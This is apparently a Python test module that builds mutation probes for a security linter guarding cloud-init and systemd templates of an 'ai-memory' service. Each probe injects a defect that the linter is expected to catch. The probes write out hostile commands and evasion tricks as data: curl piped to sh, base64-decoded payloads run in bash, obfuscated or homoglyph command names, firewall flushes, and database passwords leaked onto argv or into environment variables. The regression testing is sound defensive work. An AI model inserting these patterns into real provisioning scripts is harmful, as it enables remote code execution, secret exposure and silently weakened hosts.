UNIT_PATH = "/etc/systemd/system/ai-memory.service"
EXEC = "ExecStart=" + BIN + " serve --host 0.0.0.0"
ENVF = "      Environment=AI_MEMORY_STORE_URL_FILE=/etc/ai-memory/store-url\n"
PROV = "  - path: " + PROV_PATH + "\n"
UNIT_ENTRY = "  - path: " + UNIT_PATH + "\n"
EXT = "      sudo -u postgres psql -d aimemory -c \"CREATE EXTENSION IF NOT EXISTS vector;\"\n"
RELOAD = "      systemctl daemon-reload\n"
CHMOD = "      chmod 0600 /etc/ai-memory/store-url\n"
AGE = "        fetch_pinned https://github.com/apache/age.git /opt/age-src \"$AGE_COMMIT\"\n"
PIN = "AGE_COMMIT=e43dc1a12b78fba4acef9835b2b10379b8d243b4"
DSNFILE = PG + "aimemory:CHANGEME@localhost/aimemory?sslmode=verify-full&sslrootcert=/etc/ai-memory/tls/pg-ca.crt"
DSN = PG + "aimemory:" + PW + "@localhost/aimemory?sslmode=verify-full"
NOPW = PG + "aimemory@localhost/aimemory?sslmode=verify-full"
RUNCMD = "  - [bash, " + PROV_PATH + "]\n"
STORE_PERM = "  - path: /etc/ai-memory/store-url\n    permissions: '0600'\n"


def wf(path, mode, body):
    """A write_files entry inserted before the provision script entry."""
    out = ["  - path: " + path, "    permissions: '" + mode + "'", "    content: |"] + ["      " + b for b in body]
    return "\n".join(out) + "\n" + PROV


def ins(anchor, lines, before=False):
    """Insert provision-script lines (6-space indent) after (or before) anchor."""
    block = "".join("      " + x + "\n" for x in lines)
    return (anchor, block + anchor) if before else (anchor, anchor + block)


def build_probes() -> list:
    """(label, expect, spec). expect: red (a defect hit), green, fault (rc 2).
    spec keys: aws/do (mutations), autolist, extra, allow/pend (text edits),
    templates (replace the set), maintf (aws main.tf text)."""
    P = []

    def red(label, muts, autolist=True, **kw):
        P.append((label, "red", dict(aws=muts, autolist=autolist, **kw)))

    def green(label, muts, autolist=False, **kw):
        P.append((label, "green", dict(aws=muts, autolist=autolist, **kw)))

    # ---- security reviewer round 1 (#4662/#4663/#4664) and round 2 (#4687-#4693)
    REPL = '            "hostnossl replication all all reject" \\\n'
    red("S-4676 replication reject line deleted (aws)", [(REPL, "")])
    red("S-4676 replication reject turned into an accept (aws)", [(REPL, '            "hostnossl replication all all scram-sha-256" \\\n')])
    red("S-4676 replication reject narrowed to one role (aws)", [(REPL, '            "hostnossl replication aimemory all reject" \\\n')])
    HCAT = '          cat "$HBA"; } > "$HBA.new"\n'
    red("S-4676 replication reject moved after the packaged lines (aws)", [(REPL, ""), (HCAT, '          cat "$HBA"\n          printf \'%s\\n\' "hostnossl replication all all reject"; } > "$HBA.new"\n')])
    red("S-4676 replication reject only on a no-op command (aws)", [(REPL, ""), (HCAT, HCAT + '          : "hostnossl replication all all reject"\n')])
    red("S-4676 all-roles reject only printed to /dev/null (aws)", [('            "hostnossl all all all reject" \\\n', ""), (HCAT, HCAT + '          printf \'%s\\n\' "hostnossl all all all reject" > /dev/null\n')])
    red("S-R1 runtime argv via sh -c", [(EXEC, "ExecStart=/bin/sh -c 'exec " + BIN + " serve " + SU + " \"$(cat /etc/ai-memory/store-url)\" --host 0.0.0.0'")])
    red("S-R2 password= query on serve", [(EXEC, EXEC.replace("serve", "serve " + SU + " " + NOPW.replace("?", "?password=" + PW + "&")))])
    red("S-R3 Environment= DSN in a 0644 unit", [(ENVF, "      Environment=AI_MEMORY_STORE_URL=" + DSN + "\n")])
    red("S-R4 psql DSN on the argv in provision", [ins(EXT, ["psql \"" + PG + "aimemory:$DB_PASS@localhost/aimemory?sslmode=verify-full\" -c \"SELECT 1\""])])
    red("S-R5 literal userinfo DSN on serve", [(EXEC, EXEC.replace("serve", "serve " + SU + " " + DSN))])
    red("S-N1 EnvironmentFile holding AI_MEMORY_STORE_URL=", [(PROV, wf("/etc/ai-memory/env", "0600", ["AI_MEMORY_STORE_URL=" + DSN]))])
    red("S-N2 AI_MEMORY_STORE_URL with a space before = (#4689)", [(PROV, wf("/etc/default/ai-memory", "0644", ["AI_MEMORY_STORE_URL =" + DSN]))])
    red("S-N3 drop-in ExecStart with the store flag", [(PROV, wf("/etc/systemd/system/ai-memory.service.d/10-store.conf", "0644", ["[Service]", "ExecStart=", EXEC + " --port 9077 --tls-cert /a --tls-key /b " + SU + " " + DSN]))])
    red("S-N4 drop-in Environment=PGPASSWORD (#4687)", [(PROV, wf("/etc/systemd/system/ai-memory.service.d/10-pw.conf", "0644", ["[Service]", "Environment=PGPASSWORD=" + PW]))])
    red("S-N5 unit Environment=PGPASSWORD (#4687)", [(ENVF, ENVF + "      Environment=PGPASSWORD=" + PW + "\n")])
    red("S-N6 wrapper script the unit executes", [(PROV, wf("/usr/local/bin/ai-memory-run", "0755", ["#!/bin/sh", "exec " + BIN + " serve " + SU + " \"$(cat /etc/ai-memory/store-url)\" \"$@\""]))])
    red("S-N7 wrapper at the binary path, flag split by a variable (#4693)", [ins(RELOAD, ["printf '%s\\n' '#!/bin/sh' 'F=--store' 'exec " + BIN + ".real \"$@\" \"$F-url\" \"$(cat /etc/ai-memory/store-url)\"' > " + BIN], before=True)])
    red("S-N8 systemd-run serve with the store flag", [ins(RELOAD, ["systemd-run --uid=aimemory " + BIN + " serve --host 127.0.0.1 " + SU + " \"$(cat /etc/ai-memory/store-url)\""], before=True)])
    red("S-N9 systemd-run, store flag split by quoting (#4693)", [ins(RELOAD, ["systemd-run --uid=aimemory " + BIN + " serve --host 127.0.0.1 --sto\"re-u\"rl \"$(cat /etc/ai-memory/store-url)\""], before=True)])
    red("S-N10 ExecStart store flag split by quoting", [(EXEC, EXEC.replace("serve", "serve --sto\"re-u\"rl /x"))])
    red("S-N11 ExecStart unbraced $VAR argument list", [(ENVF, ENVF + "      EnvironmentFile=/etc/ai-memory/args\n"), (EXEC, EXEC.replace("serve", "serve $$STORE_ARGS"))])
    P.append(("S-N12 braced $${VAR} as a --host value (benign)", "green", dict(aws=[(ENVF, ENVF + "      EnvironmentFile=/etc/ai-memory/args\n"), (EXEC, EXEC.replace("--host 0.0.0.0", "--host $${H}"))], autolist=True, core=True)))
    red("S-N13 pg_isready -d DSN", [ins(EXT, ["pg_isready -d \"" + PG + "aimemory:$DB_PASS@localhost/aimemory?sslmode=verify-full\""])])
    red("S-N14 pg_dump --dbname=DSN (#4690)", [ins(EXT, ["pg_dump --dbname=" + PG + "aimemory:$${DB_PASS}@localhost/aimemory?sslmode=verify-full -f /dev/null"])])
    red("S-N15 psql percent-encoded pass%77ord= key (#4691)", [ins(EXT, ["psql \"" + PG + "aimemory@localhost/aimemory?sslmode=verify-full&pass%77ord=$DB_PASS\" -c \"SELECT 1\""])])
    red("S-N16 psql keyword conninfo password= (#4692)", [ins(EXT, ["psql \"host=localhost dbname=aimemory user=aimemory password=$DB_PASS sslmode=verify-full\" -c \"SELECT 1\""])])
    red("S-N17 lax-permission opt-out with a 0644 store-url (#4688)", [(ENVF, ENVF + "      Environment=AI_MEMORY_STORE_URL_FILE_ALLOW_LAX_PERMS=1\n"), (CHMOD, CHMOD.replace("0600", "0644"))])
    # ---- code reviewer round 1 and round 2 (#4657, #4682-#4685)
    red("C-R1 git -C checkout of a branch", [(AGE, "        git init -q /opt/age-src && git -C /opt/age-src remote add origin https://github.com/apache/age.git\n        git -C /opt/age-src fetch -q origin release/PG18/1.8.0\n        git -C /opt/age-src checkout -q FETCH_HEAD\n")], autolist=False)
    red("C-R1 fetch_pinned without rev-parse", [("          && [ \"$(git -C \"$2\" rev-parse HEAD)\" = \"$3\" ] \\\n", "")], autolist=False)
    red("C-R1 fetch_pinned with a branch literal", [("\"$AGE_COMMIT\"", "release/PG18/1.8.0")], autolist=False)
    red("C-R1 weak DSN through Environment=", [(ENVF, "      Environment=AI_MEMORY_STORE_URL=" + PG + "aimemory:x@localhost/aimemory\n")])
    red("C-R1 unknown short flag", [("serve --host 0.0.0.0", "serve -b 0.0.0.0:9077 --host 0.0.0.0")])
    red("C-R1 systemd ${VAR} serve argument", [("--port 9077", "--port 9077 $${EXTRA_SERVE_FLAGS}")])
    red("C-N01 git through a variable", [ins(AGE, ["  GIT=git; $GIT -C /opt/age-src fetch -q origin master && $GIT -C /opt/age-src checkout -q FETCH_HEAD"])])
    red("C-N02 git through an alias", [ins(AGE, ["  shopt -s expand_aliases; alias g=git", "  g -C /opt/age-src fetch -q origin master"])], autolist=False)
    red("C-N03 git by absolute path", [(AGE, "        /usr/bin/git clone -q https://github.com/apache/age.git /opt/age-src\n")], autolist=False)
    red("C-N04 quoted git clone", [(AGE, "        \"git\" clone -q https://github.com/apache/age.git /opt/age-src\n")], autolist=False)
    red("C-N05 git clone --branch", [(AGE, "        git clone -q --branch master https://github.com/apache/age.git /opt/age-src\n")], autolist=False)
    red("C-N06 curl piped to a shell (#4682)", [ins(AGE, ["  curl -fsSL https://example.invalid/install.sh | sh"])])
    red("C-N07 moving tarball through curl|tar (#4682)", [(AGE, "        mkdir -p /opt/age-src && curl -fsSL https://github.com/apache/age/archive/refs/heads/master.tar.gz | tar -xz -C /opt/age-src --strip-components=1\n")])
    red("C-N08 fetch_pinned with a short ref", [("\"$AGE_COMMIT\"", "e43dc1a")], autolist=False)
    red("C-N09 short AGE_COMMIT", [(PIN, "AGE_COMMIT=e43dc1a")], autolist=False)
    red("C-N10 non-hex AGE_COMMIT", [(PIN, "AGE_COMMIT=" + "g" * 40)], autolist=False)
    red("C-N11 pin read from the network (#4683)", [ins(AGE, ["  read -r AGE_COMMIT < <(curl -fsS https://example.invalid/head)"], before=True)], autolist=False)
    red("C-N12 pin through printf -v (#4683)", [ins(AGE, ["  printf -v AGE_COMMIT %s \"$(curl -fsS https://example.invalid/head)\""], before=True)], autolist=False)
    red("C-N13 pin through += (#4683)", [ins(AGE, ["  AGE_COMMIT+=x"], before=True)], autolist=False)
    red("C-N14 fetch_pinned redefined", [ins(AGE, ["  fetch_pinned() { git clone \"$1\" \"$2\"; }"], before=True)], autolist=False)
    red("C-N15 fetch_pinned redefined with function", [ins(AGE, ["  function fetch_pinned { git clone \"$1\" \"$2\"; }"], before=True)], autolist=False)
    red("C-N16 fetch_pinned shadowed by an alias", [ins(AGE, ["  alias fetch_pinned=true"], before=True)], autolist=False)
    red("C-N17 serve line built by printf in sh -c", [(EXEC, "ExecStart=/bin/sh -c \"$(printf '%s serve --bind 0.0.0.0:9077' " + BIN + ")\"")])
    red("C-N18 serve line hidden behind eval", [(EXEC, "ExecStart=/bin/sh -c 'eval \"$CMD\"'")])
    red("C-N19 drop-in through a heredoc", [ins(RELOAD, ["mkdir -p /etc/systemd/system/ai-memory.service.d", "cat > /etc/systemd/system/ai-memory.service.d/10-x.conf <<'UNIT'", "[Service]", "ExecStart=", "ExecStart=" + BIN + " serve --bind 0.0.0.0:9077", "UNIT"], before=True)], autolist=False)
    red("C-N20 drop-in through a printf one-liner (#4684)", [ins(RELOAD, ["mkdir -p /etc/systemd/system/ai-memory.service.d", "printf '[Service]\\nExecStart=\\nExecStart=" + BIN + " serve --bind 0.0.0.0:9077\\n' > /etc/systemd/system/ai-memory.service.d/10-x.conf"], before=True)], autolist=False)
    red("C-N21 EnvironmentFile carrying AI_MEMORY_STORE_URL", [(UNIT_ENTRY, "  - path: /etc/ai-memory/env\n    permissions: '0600'\n    content: |\n      AI_MEMORY_STORE_URL=" + NOPW + "\n" + UNIT_ENTRY)])
    red("C-N22 drop-in by a write_files entry", [(UNIT_ENTRY, "  - path: /etc/systemd/system/ai-memory.service.d/override.conf\n    content: |\n      [Service]\n      ExecStart=\n      ExecStart=" + BIN + " serve --bind 0.0.0.0:9077 --tls-cert /a --tls-key /b\n" + UNIT_ENTRY)])
    red("C-N23 drop-in with a weak Environment URL", [(UNIT_ENTRY, "  - path: /etc/systemd/system/ai-memory.service.d/override.conf\n    content: |\n      [Service]\n      Environment=AI_MEMORY_STORE_URL=" + PG + "aimemory@localhost/aimemory\n" + UNIT_ENTRY)])
    red("C-N24 trailing blanks after a continuation backslash", [("--port 9077 ", "--port 9077 \\   \n        --bind 0.0.0.0:9077 ")])
    red("C-N25 SSLMODE upper-case key (#4685)", [(DSNFILE, DSNFILE.replace("sslmode=", "SSLMODE="))])
    red("C-N26 percent-encoded key override ssl%6Dode=disable (#4685)", [(DSNFILE, DSNFILE + "&ssl%6Dode=disable")])
    red("C-N27 percent-encoded sslmode value", [(DSNFILE, DSNFILE.replace("verify-full", "verify%2Dfull"))])
    red("C-N28 trailing weak sslmode", [(DSNFILE, DSNFILE + "&sslmode=require")])
    red("C-N30 unknown launcher before serve", [(EXEC, EXEC.replace("ExecStart=/usr", "ExecStart=/usr/bin/nice -n 5 /usr"))])
    red("C-N31 postgresql:// with sslmode=require", [(DSNFILE, DSNFILE.replace(PG, "postgresql://").replace("verify-full", "require"))])
    # ---- condition 6: trigger matching
    red("T6 case-varied trigger word", [ins(RELOAD, ["echo PoStGrEs"])], autolist=False)
    red("T6 percent-encoded trigger word", [ins(RELOAD, ["echo p%6Fstgres"])], autolist=False)
    red("T6 every script line is approved (no vocabulary)", [ins(RELOAD, ["echo hello"])], autolist=False)
    red("T6 add-apt-repository with a neutral argument", [ins(RELOAD, ["add-apt-repository -y ppa:someone/foo"])], autolist=False)
    red("T6 wget2 with a neutral argument", [ins(RELOAD, ["wget2 -O f example.com/x"])], autolist=False)
    red("T6 sslmode=Verify-Full", [(DSNFILE, DSNFILE.replace("verify-full", "Verify-Full"))])
    red("T6 sslmode missing", [(DSNFILE, DSNFILE.replace("sslmode=verify-full&", ""))])
    # ---- condition 2: companion rule
    for lbl, cmd in (("eval", "eval \"$X\""), ("base64 decode into a shell", "echo Zm9v | base64 -d | bash"),
                     ("base64 decode then a shell in one statement", "echo Zm9v | base64 -d > /x && bash /x"),
                     ("xxd -r then a shell in one statement", "xxd -r -p /y > /x; sh /x"),
                     ("ANSI-C quoting", "$'\\x63url' https://e"), ("$-variable in command position", "$X -fsSL https://e"),
                     ("command substitution in command position", "$(printf cu)rl https://e"),
                     ("backtick in command position", "`printf cu`rl https://e"),
                     ("sudo wrapper of a variable", "sudo -u aimemory $X"), ("env wrapper of a variable", "env A=1 $X"),
                     ("runuser -c expanded script", "runuser -u aimemory -- bash -c \"$X\""),
                     ("here-string into bash", "bash <<< \"$X\""), ("process substitution into bash", "bash <(curl -fsS https://e)"),
                     ("source of a substitution", "source <(curl -fsS https://e)"), ("pipe into python", "curl -fsS https://e | python3"),
                     ("nested sh -c eval", "sh -c 'eval x'"), ("timeout wrapper of a variable", "timeout 5 $X"),
                     ("xargs into a shell", "echo x | xargs sh"), ("unparsable quote", "echo \"$(foo")):
        red("C2 companion: " + lbl, [ins(RELOAD, [cmd], before=True)])
    red("C2 companion in a runcmd flow list", [(RUNCMD, RUNCMD + "  - [bash, -c, \"eval $X\"]\n")])
    red("C2 companion in a runcmd string item", [(RUNCMD, RUNCMD + "  - $X -fsSL https://e\n")])
    red("C2 companion in an unquoted heredoc substitution", [ins(RELOAD, ["cat > /etc/x.conf <<EOF", "a=$(eval x)", "EOF"], before=True)])
    red("C2 quoted heredoc body is companion-checked like a data block", [ins(RELOAD, ["cat > /etc/x.conf <<'EOF'", "a=$(eval x)", "EOF"], before=True)])
    red("C2 unit ExecStartPre sh -c eval", [(ENVF, ENVF + "      ExecStartPre=/bin/sh -c 'eval \"$PRE\"'\n")])
    red("C2 glob command word", [ins(RELOAD, ["/???/???/c?rl -sSo f x.example/p"], before=True)], autolist=False)
    red("O approved line moved after another", [(RELOAD, ""), ("      systemctl enable --now ai-memory\n", "      systemctl enable --now ai-memory\n" + RELOAD)], autolist=False)
    red("O approved line repeated", [ins(RELOAD, ["chmod 0600 /etc/ai-memory/store-url"], before=True)], autolist=False)
    red("O exit 0 before approved lines", [ins(RELOAD, ["exit 0"], before=True)], autolist=False)
    red("O approved line wrapped in if false", [ins(RELOAD, ["if false; then"], before=True)], autolist=False)
    # ---- round 3 (#4784-#4786, #4793-#4795): every probe of both reviewers is a permanent case
    sha = ('      echo "${ai_memory_image_sha256}  $DL/ai-memory.tar.gz" | sha256sum -c - \\\n'
           '        || { echo "ai-memory tarball digest mismatch"; rm -f "$DL/ai-memory.tar.gz"; exit 1; }\n')
    tar_x = '      tar -xzf "$DL/ai-memory.tar.gz" --no-same-owner -C "$DL/x" ai-memory\n'
    swap = ('        [ -z "$(swapon --show --noheadings)" ] \\\n'
            '          || { echo "swap is active: refusing to write the CA key"; exit 1; }\n')
    member = ('      [ -f "$DL/x/ai-memory" ] && [ ! -L "$DL/x/ai-memory" ] \\\n'
              '        || { echo "tarball member ai-memory is not a regular file"; exit 1; }\n')
    owner = ('      [ "$(stat -c %U /opt/ai-memory)" = aimemory ] \\\n'
             '        || { echo "/opt/ai-memory is not owned by aimemory"; exit 1; }\n')
    hba = '            "hostnossl all all all reject" \\\n'
    inst = '      install -o root -g root -m 0755 "$DL/x/ai-memory" /usr/local/lib/ai-memory/bin/ai-memory\n'
    curl_bin = '      curl -fsSL "${ai_memory_image_url}" -o "$DL/ai-memory.tar.gz"\n'
    unit_exec = "      ExecStart=/usr/local/lib/ai-memory/bin/ai-memory serve"
    daemon_env = "      Environment=AI_MEMORY_STORE_URL_FILE=/etc/ai-memory/store-url\n"
    dec = "      systemctl daemon-reload\n"
    mk = "        make install PG_CONFIG=/usr/bin/pg_config\n"
    home = "      # --- user + dirs ---\n"
    sec = [
        ("P1 tf %{if false} around the digest check", [(sha, "%{ if false }\n" + sha + "%{ endif }\n")]),
        ("P2 sh if false around the digest check", [(sha, "      if false; then\n" + sha + "      fi\n")]),
        ("P3 digest check moved after the install", [(sha, ""), (inst, inst + sha)]),
        ("P4 lone CR turns a comment into a command", [(home, home.rstrip("\n") + "\r      chmod 0644 /etc/ai-memory/store-url\n")]),
        ("P5 pg_conftool listen_addresses", [ins(RELOAD, ["pg_conftool 18 main set listen_addresses '*'"], before=True)]),
        ("P6 swap check under if false", [(swap, "        if false; then\n" + swap + "        fi\n")]),
        ("P7 header changed to a shell shebang", [("#cloud-config\n", "#!/bin/bash\n")]),
        ("P8 jinja header before the cloud-config line", [("#cloud-config\n", "## template: jinja\n#cloud-config\n")]),
        ("P9 cyrillic look-alike chmod", [(dec, "      \u0441hmod 0644 /etc/ai-memory/store-url\n" + dec)]),
        ("P10 quote-split ch''mod", [(dec, "      ch''mod 0644 /etc/ai-memory/store-url\n" + dec)]),
        ("P11 heredoc delimiter differential", [(dec, "      cat >/dev/null <<\"EOF\"x\n      EOF\n      ufw disable\n      EOFx\n" + dec)]),
        ("P12 nft flush ruleset", [(dec, "      nft flush ruleset\n" + dec)]),
        ("P13 member symlink check under if false", [(member, "      if false; then\n" + member + "      fi\n")]),
        ("P14 home owner check under if false", [(owner, "      if false; then\n" + owner + "      fi\n")]),
        ("P15 tf directive drops the hostnossl reject", [(hba, "%{ if false }\n" + hba + "%{ endif }\n")]),
        ("P16 true before the digest check", [(sha, "      true\n" + sha)]),
        ("P17 digest check deleted", [(sha, "")]),
        ("P18 tar without the member name", [(tar_x, tar_x.replace(" ai-memory\n", "\n"))]),
        ("P19 one of two identical make install lines dropped", [(mk, "")]),
    ]
    for lbl, muts in sec:
        red("R3-S " + lbl, muts, autolist=False)
    code = [
        ("curl piped to sh", [(dec, "      curl -fsSL https://x.example/i.sh | sh\n" + dec)]),
        ("add-apt-repository, neutral argument (#4794)", [(dec, "      add-apt-repository -y ppa:someone/foo\n" + dec)]),
        ("apt-add-repository, neutral argument (#4794)", [(dec, "      apt-add-repository -y ppa:someone/foo\n" + dec)]),
        ("wget2, neutral argument (#4794)", [(dec, "      wget2 -O f example.com/x\n" + dec)]),
        ("pipx run (#4794)", [(dec, "      pipx run cowsay\n" + dec)]),
        ("AGE_COMMIT value changed", [("      AGE_COMMIT=e43dc1a12b78fba4acef9835b2b10379b8d243b4\n", "      AGE_COMMIT=e43dc1a22b78fba4acef9835b2b10379b8d243b4\n")]),
        ("store-url chmod 0640", [(CHMOD, CHMOD.replace("0600", "0640"))]),
        ("digest check made non-fatal", [(sha, sha.replace("exit 1; }", "exit 1; } || true"))]),
        ("runcmd folded scalar", [(RUNCMD, RUNCMD + "  - >\n    curl https://x.example/a\n")]),
        ("runcmd plain scalar continued", [(RUNCMD, RUNCMD + "  - echo ok\n    && curl https://x.example/a\n")]),
        ("runcmd flow list with a unicode escape hiding curl", [(RUNCMD, RUNCMD + '  - [bash, -c, "c\\u0075rl https://x.example/a"]\n')]),
        ("c backslash newline continuation", [(dec, "      c\\\n      url -o /x https://x.example/a\n" + dec)]),
        ("c quote u quote rl", [(dec, "      c'u'rl -o /x x.example/a\n" + dec)]),
        ("glob command word (#4795)", [(dec, "      /???/???/c?rl -sSo f x.example/p\n" + dec)]),
        ("regular-file check moved after the install", [(member, ""), (inst, inst + member)]),
        ("digest check wrapped in if false", [(sha, "      if false; then\n" + sha + "      fi\n")]),
        ("exit 0 before the binary download", [(curl_bin, "      exit 0\n" + curl_bin)]),
        ("approved line duplicated", [(dec, "      chmod 0600 /etc/ai-memory/store-url\n" + dec)]),
        ("shell comment inside a double-quoted multi-line string", [(dec, '      echo "a\n      # curl x\n      b"\n' + dec)]),
    ]
    for lbl, muts in code:
        red("R3-C " + lbl, muts, autolist=False)
    listed = [
        ("serve --store_url", [(unit_exec, unit_exec + " --store_url /x")]),
        ("serve unknown long flag --bind", [(unit_exec, unit_exec + " --bind 0.0.0.0:9077")]),
        ("eval in a listed line", [(dec, '      eval "echo hi"\n' + dec)]),
        ("base64 -d | bash in a listed line", [(dec, "      echo ZWNobw== | base64 -d | bash\n" + dec)]),
        ("ANSI-C quoting in a listed line", [(dec, "      echo $'\\x41'\n" + dec)]),
        ("variable in command position in a listed line", [(dec, '      X=curl; "$X" https://x.example\n' + dec)]),
        ("unit ExecStartPre sh -c eval, listed (#4793)", [(daemon_env, daemon_env + "      ExecStartPre=/bin/sh -c 'eval \"$PRE\"'\n")]),
        ("quoted heredoc with eval, listed (#4793)", [(dec, "      cat > /usr/local/bin/pre <<'EOF'\n      #!/bin/sh\n      eval \"$1\"\n      EOF\n" + dec)]),
        ("quoted heredoc with base64 -d | sh, listed (#4793)", [(dec, "      cat > /usr/local/bin/pre <<'EOF'\n      echo Y3VybA== | base64 -d | sh\n      EOF\n" + dec)]),
        ("ai-memory serve in the provision script, listed (#4837)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory serve --bind 0.0.0.0:9077\n" + dec)]),
        ("sudo -u ai-memory --db serve in the provision script, listed (#4837)", [(dec, "      sudo -u aimemory /usr/local/lib/ai-memory/bin/ai-memory --db /x serve\n" + dec)]),
        ("unit ExecStartPost runs serve, listed (#4837)", [(daemon_env, daemon_env + "      ExecStartPost=/usr/local/lib/ai-memory/bin/ai-memory serve --host 0.0.0.0 --port 9078\n")]),
        ("unit ExecStartPre runs serve, listed (#4837)", [(daemon_env, daemon_env + "      ExecStartPre=/usr/local/lib/ai-memory/bin/ai-memory serve --host 0.0.0.0 --port 9078\n")]),
        ("unit ExecReload runs serve, listed (#4837)", [(daemon_env, daemon_env + "      ExecReload=/usr/local/lib/ai-memory/bin/ai-memory serve --host 0.0.0.0 --port 9078\n")]),
        ("runcmd flow list runs serve, listed (#4837)", [(RUNCMD, RUNCMD + "  - [/usr/local/lib/ai-memory/bin/ai-memory, serve, --host, 0.0.0.0, --port, '9078']\n")]),
        ("quote-split serve in the provision script, listed (#4837 R6)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory se''rve --host 0.0.0.0\n" + dec)]),
        ("backslash-split serve in the provision script, listed (#4837 R6)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory s\\erve --host 0.0.0.0\n" + dec)]),
        ("ai-memory subcommand in a variable, listed (#4837 R6)", [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db /x "$V" --host 0.0.0.0\n' + dec)]),
        ("ai-memory under xargs, listed (#4837 R6)", [(dec, "      echo serve | xargs /usr/local/lib/ai-memory/bin/ai-memory\n" + dec)]),
        ("eval indented below the content block, listed (#4836)", [(dec, dec + '    eval "$PRE"\n')]),
        ("eval indented to the write_files key, listed (#4836)", [(dec, dec + '  eval "$PRE"\n')]),
        ("write_files encoding b64, listed", [(PROV, "  - path: /etc/x.sh\n    encoding: b64\n    content: |\n      Y3VybCBodHRwczovL3g=\n" + PROV)]),
    ]
    for lbl, muts in listed:
        red("R3-C listed " + lbl, muts, autolist=True)
    green("R3-C YAML comment line in runcmd is inert", [(RUNCMD, RUNCMD + "  # curl https://x.example | sh\n")])
    P.append(("R3-C AWS-only line copied into do-hive", "red", dict(do=[(dec, "      chown aimemory:aimemory /etc/ai-memory/store-url\n" + dec)], autolist=False)))
    # ---- validators
    red("V store-url permissions '0644'", [(STORE_PERM, STORE_PERM.replace("0600", "0644"))])
    red("V store-url permissions line removed", [(STORE_PERM, "  - path: /etc/ai-memory/store-url\n")])
    red("V chmod of the store-url to 0640", [(CHMOD, CHMOD.replace("0600", "0640"))])
    red("V write_files encoding: b64", [(STORE_PERM, STORE_PERM + "    encoding: b64\n")])
    red("V write_files !!binary content", [(PROV, "  - path: /etc/x\n    content: !!binary |\n      eA==\n" + PROV)])
    red("V write_files source: uri", [(PROV, "  - path: /etc/x\n    source:\n      uri: https://e/x\n" + PROV)])
    red("V curl failure ignored", [ins(RELOAD, ["curl -fsSL https://e -o /x || true"])])
    red("V tar extract failure ignored", [ins(RELOAD, ["tar -xzf /x -C /y || true"])])
    red("V unit binary in the service home", [(EXEC, EXEC.replace(BIN, "/opt/ai-memory/bin/ai-memory"))])
    red("V redirect writes the unit binary", [ins(RELOAD, ["printf x > " + BIN], before=True)])
    red("V tee writes the unit binary", [ins(RELOAD, ["printf x | tee " + BIN], before=True)])
    red("V password= in a unit", [(ENVF, ENVF + "      Environment=DB_ARGS=password=" + PW + "\n")])
    red("V SQL PASSWORD literal on a psql argv", [ins(EXT, ["sudo -u postgres psql -c \"ALTER USER aimemory WITH PASSWORD '" + PW + "';\""])])
    red("V terraform secret into user-data", [ins(EXT, ["echo \"${db_password}\" > /etc/x"])])
    red("V AI_MEMORY_STORE_URL_FILE_ALLOW_LAX_PERMS alone", [(ENVF, ENVF + "      Environment=AI_MEMORY_STORE_URL_FILE_ALLOW_LAX_PERMS=1\n")])
    red("V PGPASSFILE in provision", [ins(EXT, ["export PGPASSFILE=/root/.pgpass"])])
    # ---- structure
    red("Y write_files entry not led by path", [(PROV, "  - permissions: '0644'\n    path: /etc/x\n" + PROV)], autolist=False)
    red("Y folded content scalar", [(PROV, "  - path: /etc/x\n    content: >\n      curl https://e\n" + PROV)])
    red("Y runcmd block-scalar item", [(RUNCMD, RUNCMD + "  - |\n    curl https://e | sh\n")])
    red("Y runcmd item spanning lines", [(RUNCMD, RUNCMD + "  - \"curl\n    https://e\"\n")])
    red("Y unterminated heredoc", [ins(RELOAD, ["cat > /etc/x <<EOF", "a"], before=True)])
    red("Y tab in YAML indentation", [(RUNCMD, RUNCMD + "\t- [true]\n")])
    # ---- condition 5: normalisation and comments
    green("C5 extra blanks inside a listed line", [(RELOAD, "      systemctl    daemon-reload   \n")])
    green("C5 provision comment mentioning curl", [ins(RELOAD, ["# curl -fsSL https://e | sh"], before=True)])
    green("C5 unit comment naming ExecStart", [(ENVF, ENVF + "      # ExecStart=/bin/evil\n")])
    green("C5 YAML comment", [(RUNCMD, "  # curl https://e | sh\n" + RUNCMD)])
    red("C5 comment inside a heredoc body", [ins(RELOAD, ["cat > /etc/x.conf <<'EOF'", "# curl https://e | sh", "EOF"], before=True)],
        autolist=False, extra=(("aws-gpu-burst", PROV_PATH, "cat > /etc/x.conf <<'EOF'"),))
    red("C5 comment inside an open multi-line quote", [ins(RELOAD, ["X=\"a", "# curl https://e | sh", "b\""], before=True)], autolist=False)
    red("C5 comment after a continuation", [ins(RELOAD, ["echo a \\", "# curl https://e | sh"], before=True)], autolist=False)
    # ---- condition 4: unlisted token lines
    red("C4 unlisted runcmd line", [(RUNCMD, RUNCMD + "  - [curl, -o, /x, https://e]\n")], autolist=False)
    red("C4 unlisted line in write_files data", [(DSNFILE + "\n", DSNFILE + "\n      x https://e\n")], autolist=False)
    red("C4 unlisted line in a unit", [(ENVF, ENVF + "      ExecStartPre=/bin/true\n")], autolist=False)
    red("C4 unlisted line in the embedded script", [ins(RELOAD, ["bash -c 'curl https://e'"], before=True)], autolist=False)
    red("C4 unlisted line in a heredoc body", [ins(RELOAD, ["cat > /etc/x.conf <<'EOF'", "curl https://e", "EOF"], before=True)],
        autolist=False, extra=(("aws-gpu-burst", PROV_PATH, "cat > /etc/x.conf <<'EOF'"),))
    # ---- rules 1-4 and user-data
    red("R1 non-ASCII byte", [(RELOAD, "      systemctl daemon-reload —\n")], autolist=False)
    red("R2 no serve ExecStart", [(EXEC, "ExecStart=" + BIN + " mcp")])
    red("R4 missing --tls-key", [(" --tls-key /etc/ai-memory/tls/node.key", "")])
    red("U AWS main.tf without base64gzip (#4703)", [], maintf_sub=("user_data_base64 = base64gzip(templatefile(\"${path.module}/cloud-init-memory.yaml.tpl\"", "user_data = (templatefile(\"${path.module}/cloud-init-memory.yaml.tpl\""))
    red("U gzip over the limit (#4703)", [(RELOAD, RELOAD + "".join("      # %s\n" % hashlib.sha256(b"%d" % k).hexdigest() for k in range(400)))])
    P.append(("U do-hive over 64 KiB without gzip", "red", dict(do=[("runcmd:\n", "".join("# %s\n" % hashlib.sha512(b"%d" % k).hexdigest() for k in range(520)) + "runcmd:\n")], autolist=True, core=True)))
    P.append(("U template with no known limit", "fault", dict(add_template=("infra/other/cloud-init-memory.yaml.tpl", None))))
    # ---- condition 3: allowlist form
    P.append(("A malformed entry", "fault", dict(allow_add="both | only-two-fields")))
